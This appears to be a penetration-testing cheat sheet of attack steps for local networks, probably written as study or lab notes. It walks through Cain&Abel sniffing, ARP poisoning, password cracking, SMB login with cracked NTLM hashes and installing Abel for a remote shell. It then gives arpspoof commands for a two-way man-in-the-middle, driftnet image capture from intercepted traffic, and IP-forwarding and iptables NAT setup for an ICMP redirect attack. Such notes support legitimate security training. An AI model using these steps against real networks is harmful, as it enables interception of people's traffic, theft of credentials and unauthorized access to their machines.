### Cain&Abel
1. Set the ethernet card
   * `Configure > select card > OK`
2. Sniff network
   * `Sniffer` tab
   * Press `Start/Stop Sniffer` button
   * Press `Host` a right click to `Scan MAC address`
3. ARP poison
   * Press `APR` and `+` sign
   * Press Detonate (`Start/Stop APR`) button
4. Passwords
   * Press `Password`
   * Right click a password and `Crack`
5. SMB connect
   * Press `Network` tab
   * Add IP in `Quick List`
   * Connect with cracked NTLM hashes
6. Install Abel (still on `Network`)
   * Press `Services` tab, right click and `install Abel`
   * Double click IP to refresh the view and go to `Abel` and `Shell`

### arp-spoof
1. Enable IP forwarding (lets the attacking host to send packets to both spoofed machines = traffic goes through the attacking host)
   * `sudo echo 1 > /proc/sys/net/ipv4/ip_forward`
2. Arp spoof - 1st direction
   * `arpspoof -i eth1 -t <target1> -r <host/target2>`</br>
   	  where `-r` -> poisong both hosts
3. Arp spoof - 2nd direction
   * `arpspoof -i eth1 -t <host/target2> -r <target1>`
#### driftnet - capture images from network traffic and display them in an X window; optionally, capture audio streams and play them.
1. While arp-spoof is working
    * `driftnet -i <interface>`

### ICMP redirect attack
ICMP redirect attacks modify the routing table of victim hosts, by misleading victims that they provide a better metric to the target destination outside the LAN.
This redirection causes the victim hosts to update their routing table and insert “better priority” gateway alternatives through the attacker’s host instead to reach the destination network.
1. Enable IP forwarding (lets the attacking host to send packets to both spoofed machines = traffic goes through the attacking host)
   * `sudo echo 1 > /proc/sys/net/ipv4/ip_forward`
2. `iptables -t nat -A POSTROUTING -s <10.100.13.0/255.255.255.0> -o <interface> -j MASQUERADE`
   * `iptables -t nat -L` - check NAT table

## Cool resources
https://ivanitlearning.wordpress.com/2019/05/20/icmp-redirect-attacks-with-scapy/
